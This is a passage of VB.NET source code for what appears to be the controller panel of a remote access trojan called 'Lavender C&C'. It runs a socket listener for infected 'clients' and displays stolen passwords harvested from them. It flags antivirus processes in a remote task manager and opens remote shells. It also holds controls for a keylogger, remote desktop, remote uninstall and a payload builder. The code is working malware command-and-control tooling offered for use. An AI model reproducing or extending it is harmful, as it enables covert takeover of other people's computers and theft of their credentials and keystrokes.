                                        Dim z As System.Drawing.Bitmap = BytesToIcon(Convert.FromBase64String(allFiles(i + 2)))
                                        ReDim Preserve icons(iconsi)
                                        icons(iconsi) = z
                                        iconsi += 1
                                        ''fff.ImgListL.Images.Add(z)
                                        ''fff.ImgListS.Images.Add(z)
                                        itm.ImageIndex = iconsi - 1 + 4
                                        ''MsgBox(fff.ImgListL.Images.Count + 4)
                                    End If

                                End If
                                fff.FileListView.Items.Add(itm)
                                i += 2
                            Next

                            fff.ImgListL.Images.Clear()
                            ''fff.ImgListS.Images.Clear()
                            fff.ImgListL.Images.Add(My.Resources.drive) ''0
                            ''fff.ImgListS.Images.Add(My.Resources.drive)
                            fff.ImgListL.Images.Add(My.Resources.drivewin) ''1
                            ''fff.ImgListS.Images.Add(My.Resources.drivewin)
                            fff.ImgListL.Images.Add(My.Resources.diskdrive) ''2
                            ''fff.ImgListS.Images.Add(My.Resources.diskdrive)
                            fff.ImgListL.Images.Add(My.Resources.folder) ''3
                            ''fff.ImgListS.Images.Add(My.Resources.folder)
                            If hasicons Then
                                fff.ImgListL.Images.AddRange(icons)
                            End If
                            fff.FileListView.EndUpdate()
                            fff.donewait()
                        End If
                    End If
                Case n.gettaskman
                    Dim f As TaskMan = My.Application.OpenForms(n.opentaskman & cli.ID)
                    If f Is Nothing Then Exit Sub
                    Dim r As String() = Split(A(1), n.splitspare) ''0 index is total ram
                    Dim allProcess As String() = Split(r(3), n.splitalt)
                    Dim rav As Long = Math.Round((Long.Parse(r(0)) - Long.Parse(r(1))) / Long.Parse(r(0)) * 100, 0) ''available ram

                    f.ListView1.Items.Clear()
                    f.ListView1.Items.Add("Populating list...").Group = f.ListView1.Groups(0)
                    f.ListView1.BeginUpdate()
                    f.ListView1.Items.Clear()
                    Dim icons() As Image
                    Dim iconsi As Integer = 0
                    f.ImageList1.Images.Clear()

                    Dim bi As Integer = 0 ''background process count
                    Dim ai As Integer = 0 ''app count
                    For i = 0 To allProcess.Length - 2
                        If f.IsHandleCreated Then
                            Dim itm As New ListViewItem

                            itm.Text = allProcess(i)


                            If allProcess(i).EndsWith("[Suspended]") Then ''if process is suspended or special case
                                itm.BackColor = Color.LightGray
                            ElseIf allProcess(i + 1) = 0 Then
                                itm.BackColor = Color.Gray
                            Else
                                itm.UseItemStyleForSubItems = False

                                Dim antivirus As String = ""

                                GetAV(allProcess(i).ToLower)
                                If Not antivirus = "" Then
                                    itm.BackColor = Color.LightSalmon
                                    itm.ToolTipText = "Antivirus Program: " & antivirus
                                Else
                                    itm.ToolTipText = Nothing ''allProcess(i)
                                End If
                            End If

                            itm.SubItems.Add(allProcess(i + 1)) ''pid
                            itm.SubItems.Add(allProcess(i + 2) & "%").BackColor = PercentColor(Double.Parse(allProcess(i + 2))) ''cpu

                            ''ram usage
                            Dim rper As Double = Long.Parse(allProcess(i + 3)) / r(0) * 100 ''percentage ram usage
                            Dim rs As String
                            rs = siz(allProcess(i + 3))
                            ''Dim rperr As Double = Math.Round(rper, 2)
                            itm.SubItems.Add(rs).BackColor = PercentColor(rper)

                            itm.SubItems.Add(allProcess(i + 4)) ''window title
                            If allProcess(i + 4) = "" Then ''if the windows title is empty then it's a background application
                                itm.Group = f.ListView1.Groups(2)
                                bi += 1
                            Else
                                itm.Group = f.ListView1.Groups(1)
                                ai += 1
                            End If

                            itm.SubItems.Add(allProcess(i + 5)) ''command line

                            f.ListView1.Items.Add(itm)

                            Dim z As System.Drawing.Bitmap
                            If Not allProcess(i + 6) = "x" Then
                                z = BytesToIcon(Convert.FromBase64String(allProcess(i + 6))) ''icon
                            Else
                                z = My.Resources.application.ToBitmap
                            End If

                            ReDim Preserve icons(iconsi)
                            icons(iconsi) = z
                            iconsi += 1
                            ''fff.ImgListL.Images.Add(z)
                            ''fff.ImgListS.Images.Add(z)
                            itm.ImageIndex = iconsi - 1

                            i += 6
                        End If
                    Next
                    ''f.ListView1.Columns.Item(3).Text = "RAM " & rav.ToString & "%"
                    f.InfoToolTip.ShowAlways = True
                    f.RAMVPB.Value = rav
                    f.InfoToolTip.SetToolTip(f.RAMVPB, "RAM Usage: " & rav & "%")
                    f.CPUVPB.Value = CInt(Fix(r(2)))
                    f.InfoToolTip.SetToolTip(f.CPUVPB, "CPU Usage: " & CInt(Fix(r(2))) & "%")
                    f.ImageList1.Images.AddRange(icons)
                    'Try
                    '    f.ListView1.Groups("AppGroup").Header = "Apps (" & ai & ")"
                    '    f.ListView1.Groups("BackgroundGroup").Header = "Background processes (" & bi & ")"
                    'Catch ex As Exception
                    '    MsgBox(ex.Message)
                    'End Try

                    f.ListView1.EndUpdate()

                    f.donewait()
                Case n.getpasswords
                    Dim f As Passwords = My.Application.OpenForms(n.openpasswords & cli.ID)
                    If f Is Nothing Then Exit Sub
                    f.clearwait()
                    f.ListView1.BeginUpdate()
                    f.ListView1.Items.Clear()
                    Dim res As String() = Split(A(1), n.splitalt)
                    Dim j As Integer = 0
                    For Each s As String In res
                        Try
                            Dim aa As String() = Split(s, "|")
                            If f.IsHandleCreated Then
                                For i = 2 To aa.Length
                                    Dim ii As New ListViewItem
                                    ii.Text = aa(i)
                                    ii.SubItems.Add(aa(i + 2))
                                    ii.SubItems.Add(aa(i + 4))
                                    ii.ImageIndex = j
                                    f.ListView1.Items.Add(ii)
                                    i += 5

                                Next
                            End If
                        Catch ex As Exception
                        End Try
                        j += 1
                    Next
                    f.ListView1.EndUpdate()
                Case n.getspecs
                    ''todo: finish
                    InfoListView.Items.Add("d").SubItems.Add("s")
                Case n.openshell ''open shell window
                    If My.Application.OpenForms(n.openshell & cli.ID) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim shp As New Shell
                    shp.cli = cli
                    shp.Name = n.openshell & cli.ID
                    shp.Text = shp.Text & cli.ID
                    shp.Show()
                Case n.getshell ''print to shell
                    Dim shp As Shell = My.Application.OpenForms(n.openshell & cli.ID)
                    If shp IsNot Nothing Then
                        shp.OutputTextBox.AppendText(vbNewLine & A(1))
                    Else
                        S.Send(cli, n.endshell)
                    End If
                Case n.endshell ''shell killed
                    If My.Application.OpenForms(n.openshell & cli.ID) Is Nothing Then Exit Sub
                    Dim shp As Shell = My.Application.OpenForms(n.openshell & cli.ID)
                    shp.OutputTextBox.AppendText(vbNewLine & "---SESSION TERMINATED---" & vbNewLine)
                Case n.openpower ''power options
                    If My.Application.OpenForms(n.openpower & cli.ID) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim pwr As New Power
                    pwr.cli = cli
                    pwr.Name = n.openpower & cli.ID
                    pwr.Text = pwr.Text & cli.ID
                    pwr.Show()
            End Select
        Catch ex As Exception
            MsgBox(ex.Message.ToString + Environment.NewLine + ex.StackTrace.ToString, MsgBoxStyle.Critical, "Error")
        End Try

    End Sub
#End Region

    ''' <summary>
    ''' Convert a percentage into its shade of yellow
    ''' </summary>
    ''' <param name="per">Percentage</param>
    ''' <returns></returns>
    Function PercentColor(ByVal per As Double) As Color
        If per > 50 Then
            Return Color.FromArgb(255, 55, 5)
        ElseIf per > 25 Then
            Return Color.FromArgb(255, 152, 56)
        ElseIf per > 10 Then
            Return Color.FromArgb(255, 206, 84)
        ElseIf per > 5 Then
            Return Color.FromArgb(255, 240, 114)
        ElseIf per > 1 Then
            Return Color.FromArgb(255, 248, 186)
        Else
            Return Color.White
        End If
    End Function


    ''' <summary>
    ''' Convert bytes to a bitmap icon
    ''' </summary>
    ''' <param name="bytes"></param>
    ''' <returns></returns>
    Function BytesToIcon(bytes As Byte()) As Bitmap
        Using ms As New MemoryStream(bytes)
            Return New Bitmap(ms) ''.RawFormat(System.Drawing.Imaging.ImageFormat.Png)
        End Using
    End Function



#Region "View/Client Control Button Events"

    Private Sub FileButton_Click(sender As Object, e As EventArgs) Handles FileButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openfileman) ' file manager
        Next
    End Sub

    Private Sub RemoteButton_Click(sender As Object, e As EventArgs) Handles RemoteButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openscreen) ''TODO
            ''S.Send(x.ToolTipText, n.plugin & "" & Sep & n.openscreen) ''TODO
        Next
    End Sub

    Private Sub KeyloggerButton_Click(sender As Object, e As EventArgs) Handles KeyloggerButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openklog)
        Next
    End Sub

    Private Sub PasswordsButton_Click(sender As Object, e As EventArgs) Handles PasswordsButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openpasswords)
        Next
    End Sub

    Private Sub UtilitiesButton_Click(sender As Object, e As EventArgs) Handles UtilitiesButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openutil)
        Next
    End Sub

    Private Sub ExitButton_Click(sender As Object, e As EventArgs) Handles ExitButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.close)
        Next
    End Sub

    Private Sub UninstallButton_Click(sender As Object, e As EventArgs) Handles UninstallButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.uninstall)
        Next
    End Sub

    Private Sub MsgSendButton_Click(sender As Object, e As EventArgs) Handles MsgSendButton.Click  ''Send messagebox
        Dim mbmsg As String = MsgTextbox.Text
        ''Dim mbtp As String ''MsgBoxStyle
        Dim mbtp As Integer ''MsgBoxStyle
        ''If InfoRadio.Checked Then mbtp = "i" Else If ExclaRadio.Checked Then mbtp = "w" Else If QuestRadio.Checked Then mbtp = "q" Else If CritRadio.Checked Then mbtp = "e"
        If InfoRadio.Checked Then mbtp = MessageBoxIcon.Information Else If ExclaRadio.Checked Then mbtp = MessageBoxIcon.Exclamation Else If QuestRadio.Checked Then mbtp = MessageBoxIcon.Question Else If CritRadio.Checked Then mbtp = MessageBoxIcon.Error
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.message & Sep & mbmsg & Sep & mbtp.ToString)
        Next
    End Sub

    Private Sub TaskmanButton_Click(sender As Object, e As EventArgs) Handles TaskmanButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.opentaskman)
        Next
    End Sub

    Private Sub RetrieveButton_Click(sender As Object, e As EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.getspecs)
        Next
    End Sub

    Private Sub Tabs_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Tabs.SelectedIndexChanged
        Tabs.SelectedTab.Refresh()
    End Sub

    Private Sub ReconnectButton_Click(sender As Object, e As EventArgs) Handles ReconnectButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.reconnect)
        Next
    End Sub

    Private Sub ShellButton_Click(sender As Object, e As EventArgs) Handles ShellButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openshell)
        Next
    End Sub

    Private Sub PowerButton_Click(sender As Object, e As EventArgs) Handles PowerButton.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(Clients.Find(Function(item) item.ID = x.SubItems.Item(0).Text), n.openpower)
        Next
    End Sub
#End Region

    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
        If L1.SelectedItems.Count >= 1 Then
            For Each x As ListViewItem In L1.SelectedItems
                If x.Group Is L1.Groups.Item(1) Then
                    Return
                End If
            Next
            Tabs.Enabled = True
            Tabs.Visible = True
            CurrentClientChange(L1.SelectedItems)
        Else
            Tabs.Enabled = False
            Tabs.Visible = False
        End If
    End Sub

    ''' <summary>
    ''' Update directory variables to current client's
    ''' </summary>
    ''' <param name="client">Client ID/Name</param>
    Public Sub CurrentClientChange(ByVal client As SelectedListViewItemCollection)
        For Each x As ListViewItem In client
            cid = x.SubItems(0).Text ''set cid to current client's ID
            cidf = cfr & Path.DirectorySeparatorChar & "hosts"
            Try
                Dim di As New DirectoryInfo(cidf)
                If Not di.Exists Then
                    di.Create()
                End If
            Catch ex As Exception
                MsgBox("Hosts folder could not be created!" & vbNewLine & ex.Message)
            End Try
            cidf = cfr & Path.DirectorySeparatorChar & "hosts" & Path.DirectorySeparatorChar & cid
            Try
                Dim di As New DirectoryInfo(cidf)
                If Not di.Exists Then
                    di.Create()
                End If
            Catch ex As Exception
                MsgBox("Hosts/current subfolder could not be created!" & vbNewLine & ex.Message)
            End Try
            HostInfoListView.Items.Clear()
            If client.Count > 1 Then
                HostInfoListView.Items.Add("Multiple items selected")
            Else
                ''PasswordTextbox.Text = pw(sock)
            End If
        Next
    End Sub

    Private Sub ListenButton_Click(sender As Object, e As EventArgs) Handles ListenButton.Click
        'PasswordTextbox.BackColor = Color.Black
        'If PasswordTextbox.Text.Length = 0 Then
        '    ErrorLabel.Text = "No Password!"
        '    PasswordTextbox.Focus()
        '    PasswordTextbox.BackColor = Color.DarkRed
        '    ''Return
        'End If
        If ListenButton.Text = "&Start" Then
            ''pw = PasswordTextbox.Text
            Try
                S = New SocketServer
                S.Start(PortValue.Value)
                Spinner.Visible = True
                ListenButton.Text = "S&top"
                ListenButton.BackColor = Color.Red
                ProfileComboBox.Enabled = False
                PortValue.Enabled = False
                ErrorLabel.Text = Nothing
                InfoLabel.Text = "Listener started"
                WriteToLog("Listener started")
                My.Settings.Port = PortValue.Value
            Catch ex As Exception
                WriteToLog("Error starting listener: " & ex.Message.ToString)
                ErrorLabel.Text = "Error starting listener"
                MsgBox(ex.Message.ToString & Environment.NewLine & ex.StackTrace.ToString, MsgBoxStyle.Critical, "Error")
            End Try
        Else
            For Each x As ListViewItem In L1.Items
                S.Disconnect(x.ToolTipText)
            Next
            S.stops()
            Spinner.Visible = False
            ListenButton.Text = "&Start"
            ListenButton.BackColor = Color.Green
            ProfileComboBox.Enabled = True
            PortValue.Enabled = True
            WriteToLog("Listener stopped")
        End If

    End Sub

#Region "Tray icon context menu items"
    Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
        Application.Exit()
    End Sub

    Private Sub TrayIcon_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles TrayIcon.MouseDoubleClick
        Me.Show()
        ShowIcon = True
        ShowInTaskbar = True
        Me.WindowState = FormWindowState.Normal
        Me.BringToFront()
    End Sub

    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        Me.Show()
        ShowIcon = True
        ShowInTaskbar = True
        Me.WindowState = FormWindowState.Normal
        Me.BringToFront()
    End Sub
#End Region

    Private Sub Main_Resize(sender As Object, e As EventArgs) Handles MyBase.Resize
        If WindowState = FormWindowState.Minimized Then
            Me.Hide()
            ''ShowIcon = False
            ShowInTaskbar = False
            TrayIcon.Visible = True
            TrayIcon.BalloonTipIcon = ToolTipIcon.Info
            TrayIcon.BalloonTipTitle = "Lavender C&C"
            TrayIcon.BalloonTipText = "Servers online: x".Replace("x", Clients.Count)
            TrayIcon.ShowBalloonTip(1000)
        End If
    End Sub

    Private Sub InfoTimer_Tick(sender As Object, e As EventArgs) Handles InfoTimer.Tick
        Try
            For Each x As ListViewItem In L1.Items
                If Integer.TryParse(x.ToolTipText, 0) = True Then
                    ''S.Send(Integer.Parse(x.ToolTipText), "info")
                End If
            Next
            If infotimeout = 0 Then
                InfoLabel.Text = Nothing
            Else
                infotimeout -= 1
            End If
        Catch ex As Exception
            MsgBox(ex.Message & vbNewLine & ex.StackTrace) ''TODO: REMOVE!
        End Try

    End Sub

    Private Sub InfoLabel_TextChanged(sender As Object, e As EventArgs) Handles InfoLabel.TextChanged
        infotimeout = 1
    End Sub

#Region "Controlbox Buttons"
    Private Sub HelpButton_Click(sender As Object, e As EventArgs) Handles AboutButton.Click
        About.Show()
    End Sub

    Private Sub BuilderButton_Click(sender As Object, e As EventArgs) Handles BuilderButton.Click
        Builder.Show()
    End Sub

    Private Sub KeysButton_Click(sender As Object, e As EventArgs) Handles KeysButton.Click
        Profiles.Show()
    End Sub
#End Region

    ''' <summary>
    ''' Copy host information to clipboard (formatted)
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    Private Sub CopyToClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToClipboardToolStripMenuItem.Click
        Dim ars As Integer = 0
        For Each x As ListViewItem In L1.SelectedItems
            ars += 6
        Next
        Dim s(ars - 1) As String
        Dim i As Integer = 0
        For Each x As ListViewItem In L1.SelectedItems
            s(i) = "===" & x.SubItems.Item(1).Text & "==="
            s(i + 1) = "ID: " & x.SubItems.Item(0).Text
            s(i + 2) = "Computer/User: " & x.SubItems.Item(2).Text
            s(i + 3) = "Country: " & x.SubItems.Item(3).Text
            s(i + 4) = "OS: " & x.SubItems.Item(4).Text
            s(i + 5) = "====================="
            ''TODO FINISH
            i += 6
        Next
        If i > 0 Then
            Dim zi As String = ""
            For Each z As String In s
                zi += z & vbNewLine
            Next
            Clipboard.SetText(zi)
        End If

    End Sub

    Private Sub PluginListView_DoubleClick(sender As Object, e As EventArgs) Handles PluginListView.DoubleClick
        For Each x As ListViewItem In PluginListView.SelectedItems
            Select Case x.ImageIndex
                Case 0 ''passwords

                Case 1 ''keylogger

                Case 2 ''remote desktop

                Case 3 ''lock
                    ''TODO
                Case Else
                    ''TODO: More plugins
            End Select
        Next
    End Sub

    Private Sub PluginListView_KeyPress(sender As Object, e As KeyPressEventArgs) Handles PluginListView.KeyPress
        If e.KeyChar = ChrW(Keys.Return) Then
            PluginListView_DoubleClick(sender, e)
        End If
    End Sub
End Class

''' <summary>
''' Client class
''' </summary>
Public Class Client
    Public ID As String
    Public Key As String
    Public Socket As Integer
    Public Cryptor As Crypt.Aes256Base64Encrypter
    Public Trusted As Boolean
    Public Sub New(
              ByVal m_ID As String,
              ByVal m_Socket As Integer,
              ByVal m_Key As String,
              ByVal m_Trusted As Boolean)
        ID = m_ID
        Socket = m_Socket
        Key = m_Key
        Cryptor = New Crypt.Aes256Base64Encrypter(m_Key)
        Trusted = m_Trusted
    End Sub
End Class